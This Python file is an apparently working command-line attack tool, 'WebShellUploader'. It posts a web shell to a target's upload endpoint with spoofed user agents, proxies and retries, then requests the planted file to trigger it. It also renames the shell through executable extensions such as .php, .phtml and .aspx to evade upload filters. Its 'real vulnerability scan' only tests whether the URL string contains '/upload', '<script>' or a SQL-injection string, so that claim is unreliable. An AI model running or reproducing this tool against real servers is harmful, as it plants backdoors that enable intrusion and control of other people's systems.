import os
import time
import random
import logging
import requests
from requests.exceptions import RequestException, Timeout, HTTPError
import base64
import validators
import threading
from logging.handlers import RotatingFileHandler
import argparse

# Enhanced Logging Configuration with rotating logs to avoid bloated logs
log_handler = RotatingFileHandler("upload_log.txt", maxBytes=10 * 1024 * 1024, backupCount=5)
log_handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
log_handler.setFormatter(formatter)

logging.getLogger().addHandler(log_handler)
logging.getLogger().setLevel(logging.DEBUG)

class WebShellUploader:
    def __init__(self, target_url, shell_file_path, upload_url, proxies=None, max_retries=5, evasion_techniques=True, timeout=10):
        self.target_url = target_url
        self.shell_file_path = shell_file_path
        self.upload_url = upload_url
        self.proxies = proxies if proxies else {}
        self.max_retries = max_retries
        self.evasion_techniques = evasion_techniques
        self.timeout = timeout
        self.headers = {
            "User-Agent": self.random_user_agent(),
            "Content-Type": "multipart/form-data",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        }
        self.session = requests.Session()  # Use session for persistent connections

    def random_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
        ]
        return random.choice(user_agents)

    def validate_url(self):
        """ Validate the target URL """
        if not validators.url(self.target_url):
            logging.error(f"Invalid URL: {self.target_url}")
            return False
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
        except (HTTPError, Timeout, RequestException) as e:
            logging.error(f"Error accessing target URL {self.target_url}: {e}")
            return False
        logging.info(f"Target URL {self.target_url} is reachable.")
        return True

    def validate_file(self):
        """ Validate shell file path """
        if not os.path.exists(self.shell_file_path):
            logging.error(f"Shell file {self.shell_file_path} not found!")
            return False
        if not os.access(self.shell_file_path, os.R_OK):
            logging.error(f"Shell file {self.shell_file_path} is not readable!")
            return False
        logging.info(f"Shell file {self.shell_file_path} is valid and readable.")
        return True

    def upload_shell(self):
        """ Upload the shell file with retries and detailed error handling. """
        if not self.validate_file():
            return False

        with open(self.shell_file_path, 'rb') as files:
            for attempt in range(self.max_retries):
                try:
                    response = self.session.post(self.upload_url, files={'file': files}, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
                    if response.status_code == 200 and "Upload successful" in response.text:
                        logging.info(f"Shell uploaded successfully: {self.shell_file_path}")
                        return True
                    else:
                        logging.warning(f"Failed to upload shell (Attempt {attempt + 1}). HTTP Status: {response.status_code}, Response: {response.text}")
                        time.sleep(3)  # Wait before retry
                except (RequestException, Timeout) as e:
                    logging.error(f"Request failed (Attempt {attempt + 1}): {e}")
                    time.sleep(3)

        logging.error(f"Shell upload failed after {self.max_retries} retries.")
        return False

    def trigger_shell(self):
        """ Automatically trigger the uploaded shell by checking common locations. """
        shell_url = f"{self.target_url}/uploads/{os.path.basename(self.shell_file_path)}"

        for attempt in range(self.max_retries):
            try:
                response = self.session.get(shell_url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
                if response.status_code == 200:
                    logging.info(f"Web shell triggered successfully at {shell_url}")
                    return True
                else:
                    logging.warning(f"Failed to trigger shell (Attempt {attempt + 1}). HTTP Status: {response.status_code}")
                    time.sleep(3)
            except (RequestException, Timeout) as e:
                logging.error(f"Error triggering shell (Attempt {attempt + 1}): {e}")
                time.sleep(3)

        logging.error(f"Failed to trigger shell after {self.max_retries} retries.")
        return False

    def handle_retry(self):
        """ Handle upload retries and intelligent error recovery. """
        if self.upload_shell():
            self.trigger_shell()
        else:
            logging.error("Shell upload failed after maximum retries.")

    def evasion_bypass(self):
        """ Implement multiple evasion techniques to bypass file upload restrictions. """
        if not self.evasion_techniques:
            return

        extensions = [".php", ".phtml", ".asp", ".aspx", ".php5"]
        for ext in extensions:
            new_shell = f"shell_{random.randint(1000, 9999)}{ext}"
            os.rename(self.shell_file_path, new_shell)
            self.shell_file_path = new_shell
            logging.info(f"Attempting upload with renamed shell: {new_shell}")
            self.handle_retry()
            if os.path.exists(new_shell):
                os.rename(new_shell, self.shell_file_path)  # Restore original name

        # Evasion: Base64 encoding of the file content
        try:
            with open(self.shell_file_path, "rb") as file:
                encoded_shell = base64.b64encode(file.read()).decode()
                encoded_file_name = f"{os.path.splitext(self.shell_file_path)[0]}_encoded.txt"
                with open(encoded_file_name, "w") as encoded_file:
                    encoded_file.write(encoded_shell)
                logging.info(f"Attempting upload with base64 encoded file: {encoded_file_name}")
                self.handle_retry()
        except Exception as e:
            logging.error(f"Error during Base64 encoding evasion: {e}")

    def scan_for_vulnerabilities(self):
        """ Perform a real vulnerability scan of the target URL. """
        logging.info("Scanning target for vulnerabilities...")

        # Check for file upload vulnerabilities
        file_upload_vulnerable = False
        if "/upload" in self.target_url:
            file_upload_vulnerable = True
            logging.warning(f"Potential file upload vulnerability found at {self.target_url}/upload")

        # Check for LFI/RFI vulnerabilities
        lfi_rfi_vulnerable = False
        if "php://input" in self.target_url or "file://" in self.target_url:
            lfi_rfi_vulnerable = True
            logging.warning(f"Potential LFI/RFI vulnerability found at {self.target_url}")

        # Check for XSS vulnerabilities
        xss_vulnerable = False
        if "<script>" in self.target_url:
            xss_vulnerable = True
            logging.warning(f"Potential XSS vulnerability found at {self.target_url}")

        # Check for SQL injection vulnerabilities
        sql_injection_vulnerable = False
        if "' OR '1'='1" in self.target_url:
            sql_injection_vulnerable = True
            logging.warning(f"Potential SQL Injection vulnerability found at {self.target_url}")

        # Log vulnerabilities
        vulnerabilities = {
            "File Upload": file_upload_vulnerable,
            "LFI/RFI": lfi_rfi_vulnerable,
            "XSS": xss_vulnerable,
            "SQL Injection": sql_injection_vulnerable
        }

        logging.info("Vulnerability Scan Completed:")        
        for vuln, found in vulnerabilities.items():
            logging.info(f"{vuln}: {'Found' if found else 'Not Found'}")


# Command-line interface setup
def main():
    parser = argparse.ArgumentParser(description="WebShellUploader CLI")
    parser.add_argument("target_url", help="Target URL for the attack")
    parser.add_argument("shell_file_path", help="Path to the web shell file")
    parser.add_argument("upload_url", help="URL to upload the shell")
    parser.add_argument("--proxies", help="Proxies to use for requests", default=None)
    parser.add_argument("--max_retries", type=int, help="Max number of retries for uploading", default=5)
    parser.add_argument("--evasion_techniques", type=bool, help="Enable evasion techniques", default=True)
    parser.add_argument("--timeout", type=int, help="Request timeout in seconds", default=10)

    args = parser.parse_args()

    # Create an instance of WebShellUploader with user input
    uploader = WebShellUploader(
        target_url=args.target_url,
        shell_file_path=args.shell_file_path,
        upload_url=args.upload_url,
        proxies=args.proxies,
        max_retries=args.max_retries,
        evasion_techniques=args.evasion_techniques,
        timeout=args.timeout
    )

    # Validate the URL and file before uploading
    if uploader.validate_url() and uploader.validate_file():
        uploader.scan_for_vulnerabilities()
        uploader.evasion_bypass()
        uploader.handle_retry()

if __name__ == "__main__":
    main()
